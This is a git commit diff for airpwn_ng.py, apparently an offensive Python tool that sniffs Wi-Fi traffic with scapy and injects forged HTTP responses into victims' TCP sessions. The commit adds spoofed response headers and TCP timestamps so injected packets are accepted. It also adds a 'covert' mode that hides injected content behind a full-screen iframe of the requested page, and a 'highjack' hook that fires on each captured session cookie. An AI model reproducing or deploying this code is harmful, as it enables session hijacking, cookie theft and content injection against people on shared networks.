b05c590dddbbd93f4a4bb8f0816e492660362508
Joao Pena Gil <somethingsyouneverforget@gmail.com>
2015-07-31 22:22:33 +0100

    multiple improvements

--- lib/airpwn_ng.py
+++ lib/airpwn_ng.py
@@ -1,9 +1,12 @@
 from threading import Thread
 from Queue import Queue, Empty
 from scapy.all import *
-import gzip
-import binascii
+import gzip,time,binascii,sys,fcntl,socket,struct
 
+global BLOCK_HOSTS
+global npackets
+npackets=0
+BLOCK_HOSTS=set()
 
 class bcolors:
     HEADER = '\033[95m'
@@ -39,10 +42,18 @@ class VictimParameters:
 			self.in_request=keyword_parameters['in_request']
 		else:
 			self.in_request=None
+		if ('covert' in keyword_parameters):
+			self.covert=keyword_parameters['covert']
+		else:
+			self.covert=False
 		if ('in_request_handler' in keyword_parameters):
 			self.in_request_handler=keyword_parameters['in_request_handler']
 		else:
 			self.in_request_handler=None
+		if ('highjack' in keyword_parameters):
+			self.highjack=keyword_parameters['highjack']
+		else:
+			self.highjack=None
 		if (self.websites is None and self.inject_file is None and self.in_request is None):
 			print "[ERROR] Please specify victim parameters"
 			exit(1)
@@ -245,16 +256,21 @@ class Victim:
 			if (existing_cookie[0] == cookie[0]):
 				exists=1
 		if (not exists and cookie[1]!="NONE"):
+			print ""
 			print "[+] New cookie detected for ",self.mac
 			print cookie
+			if (self.victim_parameters.highjack is not None):
+				self.victim_parameters.highjack(cookie)
 			self.cookies.append(cookie)
 		else:
 			if (cookie[1]=="NONE"):
 				#ADD THE NONE ANYWAY COOKIE SO GET_INJECTION() CAN SKIP TO THE NEXT IFRAME
 				self.cookies.append(cookie)
 				if (self.ip is not None):
+					print ""
 					print bcolors.WARNING+"[!] No cookie on client",self.ip," for website",cookie[0]+bcolors.ENDC
 				else:
+					print ""
 					print bcolors.WARNING+"[!] No cookie on client",self.mac," for website",cookie[0]+bcolors.ENDC
 	'''
 	Cookie handling function, if --websites is set,
@@ -277,33 +293,60 @@ class Injector:
 	def __init__(self,interface):
 		self.interface=interface
 
+	def getHwAddr(self,ifname):
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
+		mac=':'.join(['%02x' % ord(char) for char in info[18:24]])
+		return mac
+	
+	def get_headers(self,injection):
+		headers="HTTP/1.1 200 OK\r\n"
+		headers+="Date: "+time.strftime("%a, %d %b %Y %H:%M:%S GMT")+"\r\n"
+		headers+="Server: Apache\r\n"
+#		headers+="Cache-Control: public, max-age=99999\r\n"
+#		headers+="Expires:Sun, 26 Jul 2016 02:37:33 GMT\r\n"
+#		headers+="Content-Encoding: utf-8\r\n"
+		headers+="Content-Length: "+str(len(injection))+"\r\n"
+		headers+="Connection: close\r\n"
+		headers+="Content-Type: text/html\r\n"
+#		headers+="Set-Cookie: PHPSESSID=pwneduser\r\n"
+		headers+="\r\n"
+		return headers
+
+	def float_to_hex(self,f):
+		return hex(struct.unpack('<I', struct.pack('<f', f))[0])
+
 	'''
 	inject function performs the actual injection, using
 	scapy for open networks (monitor-mode) and packit for
 	WEP/WPA injection
 	'''
-	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection):
-		print bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+bcolors.ENDC
+	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr):
+		global npackets
+		npackets+=1
+		sys.stdout.write(bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+" (TOTAL: "+str(npackets)+" injected packets)\r"+bcolors.ENDC)
+		sys.stdout.flush()
 		if ("mon" in self.interface):
-			packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
+			headers=self.get_headers(injection)
+			if (TSVal is not None and TSecr is not None):
+				packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),TSVal)))])/Raw(load=headers+injection)
+			else:
+				packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),0)))])/Raw(load=headers+injection)
 			try:
 				sendp(packet,iface=self.interface,verbose=0)
 			except:
 				raise
 		else:
-			## MEASURED THIS, TAKES ABOUT 1.45ms TO DO THIS FOR A 195 LINE INJECTION (WHICH IS BIG), ballsy FROM EXAMPLES TAKES 0.1ms ON AVERAGE SO IT'S PRETTY IRRELEVANT TIME-WISE
-			k=binascii.hexlify(injection)
-			n=2
-			inject="0x"
-			for item in [k[i:i+n] for i in range(0, len(k), n)]:
-				inject+=item+" "
-			injection=inject
-			cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F FA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
-			cmd+=injection
-			cmd+='" >/dev/null 2>&1 &'
-			os.system(cmd)
-			#TODO: Send FIN to client + server to stop junk
-	#		print cmd
+			headers=self.get_headers(injection)
+			if (TSVal is not None):
+				packet=Ether(src=self.getHwAddr(self.interface),dst=vicmac)/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),TSVal)))])/Raw(load=headers+injection)
+			else:
+				packet=Ether(src=self.getHwAddr(self.interface),dst=vicmac)/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),0)))])/Raw(load=headers+injection)
+			try:
+				sendp(packet,iface=self.interface,verbose=0)
+			except:
+				raise
+			return
 		
 
 '''
@@ -319,7 +362,7 @@ class PacketHandler:
 		else:
 			self.victims=[]
 		if ('excluded' in keyword_parameters):
-			self.excluded=keyword_parameters['excluded']
+			self.excluded=self.proc_excluded(keyword_parameters['excluded'])
 		else:
 			self.excluded=None
 		if ('handler' in keyword_parameters):
@@ -344,6 +387,38 @@ class PacketHandler:
 		self.injector=Injector(self.i)
 
 	'''
+	Check if argument provided in excluded
+	is an ip, if it's not, dns resolve it
+	and add those IPs to the exclude list
+	'''
+	def proc_excluded(self,excluded):
+		processed=set()
+		for item in excluded:
+			try:
+				test=item.split(".")
+				if (len(test)!=4):
+					try:
+						processed.add(socket.gethostbyname(item))
+					except:
+						pass
+				else:
+					try:
+						if (int(test[0])>0 and int(test[0])<256):
+							if (int(test[0])>0 and int(test[0])<256):
+								if (int(test[0])>0 and int(test[0])<256):
+									if (int(test[0])>0 and int(test[0])<256):
+										processed.add(item)
+					except:
+						processed.add(socket.gethostbyname(item))
+					
+			except:
+				try:
+					processed.add(socket.gethostbyname(item))
+				except:
+					pass
+		return processed
+
+	'''
 	Looks for cookie in string returned by
 	PacketHandler.get_request(), returns
 	a List object [host,cookie] if there is
@@ -352,9 +427,9 @@ class PacketHandler:
 	def search_cookie(self,ret2):
 		if (len(ret2.strip())>0):
 			arr=ret2.split("\n")
+#			print ret2
 			host=""
 			cookie=""
-#			print ret2
 			for line in arr:
 				if ('Cookie' in line):
 					cookie=line.strip()
@@ -404,11 +479,28 @@ class PacketHandler:
 			acknum=str(int(packet.getlayer(TCP).seq)+size)
 			seqnum=packet.getlayer(TCP).ack
 			request=self.get_request(packet)
+			global BLOCK_HOSTS
+			for obj in BLOCK_HOSTS:
+				ip,seq=obj
+				if (svrip==ip and seqnum!=seq):
+#					print "REMOVING ",svrip
+					for obj2 in BLOCK_HOSTS:
+						ip2,seq2=obj2
+						if (ip2==svrip):
+							BLOCK_HOSTS.remove((ip2,seq2))
 			if ("GET" not in request):
 				return 0
+#			print BLOCK_HOSTS
+#			print request
+			try:
+				TSVal,TSecr=packet.getlayer(TCP).options[2][1]
+			except:
+				TSVal=None
+				TSecr=None
 			cookie=self.search_cookie(request)
 #			print (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
-			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
+			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,TSVal,TSecr)
+		return None
 
 	'''
 	This function does cookie management for broadcast mode
@@ -422,7 +514,6 @@ class PacketHandler:
 			try:
 				k=cookie[1]
 			except:
-#				print cookie
 				cookie=["NONE","NONE"]
 			if (cookie[1] is not None):
 				exists=0
@@ -554,7 +645,36 @@ class PacketHandler:
 					if (exists==0):
 						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
 						self.newvictims.append(v1)
-					
+
+	def covert_injection(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection):
+		global BLOCK_HOSTS
+#		print svrip,BLOCK_HOSTS
+		for obj in BLOCK_HOSTS:
+			ip,seq=obj
+			if (svrip==ip):
+				return 0
+		BLOCK_HOSTS.add((svrip,seqnum))
+#		print BLOCK_HOSTS
+		req=request.split("\n")
+		filename=""
+		host=""
+		for line in req:
+			if ("GET" in line):
+				filename=line.split()[1].strip()
+			if ("Host" in line):
+				host=line.split()[1].strip()
+		if (len(host)>0 and len(filename)>0):
+			injection+=""" <body style="margin:0px;padding:0px;overflow:hidden">"""
+			injection+=""" <iframe src=" """
+			if (host in filename):
+				injection+="http://"+filename[1:]
+			else:
+				injection+="http://"+host+filename
+				injection+=""" " frameborder="0" style="overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;position:absolute;top:0px;left:0px;right:0px;bottom:0px" height="100%" width="100%"></iframe> """
+				injection+="</body>"
+#		print injection
+		return injection
+				
 	'''
 	Process injection function, uses the PacketHandler.victims List
 	if it was set, to check if the packet belongs to any of the targets.
@@ -562,7 +682,7 @@ class PacketHandler:
 	for the victim in PacketHandler.newvictims and gets the injection for
 	it, if there is one, and injects it via Injector.inject()
 	'''
-	def proc_injection(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
+	def proc_injection(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,TSVal,TSecr):
 		if (len(self.victims)==0):
 			if (self.victim_parameters.in_request is not None):
 				result=self.victim_parameters.proc_in_request(request)
@@ -570,21 +690,34 @@ class PacketHandler:
 				if (not result):
 					return 0
 			if (self.excluded is not None):
-				for host in self.excluded:
-					if (svrip in host):
-						return 0
+				if (svrip in self.excluded):
+					return 0
 			for victim in self.newvictims:
 				if (victim.ip is not None):
 					if (victim.ip==vicip):
 						injection=victim.get_injection()
 						if (injection is not None):
-							self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+							if (victim.victim_parameters.covert):
+								cov_injection=self.covert_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection)
+								if (cov_injection!=0):
+									injection=cov_injection
+								else:
+									return 0
+#							print injection
+							self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr)
 				else:
 					if (victim.mac is not None):
 						if (victim.mac.lower()==vicmac.lower()):
 							injection=victim.get_injection()
 							if (injection is not None):
-								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+								if (victim.victim_parameters.covert):
+									cov_injection=self.covert_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection)
+									if (cov_injection!=0):
+										injection=cov_injection
+									else:
+										return 0
+#								print injection
+								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr)
 		else:
 			if (self.victim_parameters is not None):
 				if (self.victim_parameters.in_request is not None):
@@ -593,25 +726,37 @@ class PacketHandler:
 					if (not result):
 						return 0
 				if (self.excluded is not None):
-					for host in self.excluded:
-						if (svrip in host):
-							return 0
+					if (svrip in self.excluded):
+						return 0
 				for victim in self.newvictims:
 					if (victim.ip is not None):
 						if (victim.ip==vicip):
 							injection=victim.get_injection()
 							if (injection is not None):
-								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+								if (victim.victim_parameters.covert):
+									cov_injection=self.covert_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection)
+									if (cov_injection!=0):
+										injection=cov_injection
+									else:
+										return 0
+#								print injection
+								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr)
 					else:
 						if (victim.mac is not None):
 							if (victim.mac.lower()==vicmac.lower()):
 								injection=victim.get_injection()
 								if (injection is not None):
-									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)			
+									if (victim.victim_parameters.covert):
+										cov_injection=self.covert_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection)
+										if (cov_injection!=0):
+											injection=cov_injection
+										else:
+											return 0
+#									print injection
+									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr)			
 			if (self.excluded is not None):
-				for host in self.excluded:
-					if (svrip in host):
-						return 0
+				if (svrip in self.excluded):
+					return 0
 			for victim in self.victims:
 				if (victim.ip is not None):
 					if (victim.ip==vicip):
@@ -622,7 +767,14 @@ class PacketHandler:
 						injection=victim.get_injection()
 						if (injection is not None):
 #							print vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection
-							self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+							if (victim.victim_parameters.covert):
+								cov_injection=self.covert_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection)
+								if (cov_injection!=0):
+									injection=cov_injection
+								else:
+									return 0
+#							print injection
+							self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr)
 				else:
 					if (victim.mac is not None):
 						if (victim.mac.lower()==vicmac.lower()):
@@ -632,7 +784,15 @@ class PacketHandler:
 									return 0
 							injection=victim.get_injection()
 							if (injection is not None):
-								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
+								if (victim.victim_parameters.covert):
+									cov_injection=self.covert_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,injection)
+									if (cov_injection!=0):
+										injection=cov_injection
+									else:
+										return 0
+#								print injection
+								#print host,filename
+								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr)
 
 	'''
 	Process packets coming from the sniffer.
@@ -647,12 +807,13 @@ class PacketHandler:
 			self.handler(interface,pkt)
 		else:
 #			ls(pkt)
+
 			try:
-				vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie=self.handle_default(pkt)
+				vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,TSVal,TSecr=self.handle_default(pkt)
 			except:
 				return
 			self.cookie_mgmt(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
-			self.proc_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
+			self.proc_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,TSVal,TSecr)
 
 '''
 Sniffer class
@@ -685,9 +846,9 @@ class Sniffer:
 	'''
 	def sniff(self,q):
 		if ("mon" in self.m):
-			sniff(iface = self.m, prn = lambda x : q.put(x))
+			sniff(iface = self.m, prn = lambda x : q.put(x),store=0)
 		else:
-			sniff(iface = self.m,filter = self.filter, prn = lambda x : q.put(x))
+			sniff(iface = self.m,filter = self.filter, prn = lambda x : q.put(x),store=0)
 
 	'''
 	This starts a Queue which receives packets and processes them
@@ -695,7 +856,7 @@ class Sniffer:
 	Call this function to begin actual sniffing+injection
 	'''
 	def threaded_sniff(self):
-		q = Queue(200)
+		q = Queue()
 		sniffer = Thread(target = self.sniff, args=(q,))
 		sniffer.daemon = True
 		sniffer.start()
@@ -705,6 +866,7 @@ class Sniffer:
 				self.packethandler.process(self.m,pkt)
 				q.task_done()
 			except Empty:
+#				q.task_done()
 				pass
 
 
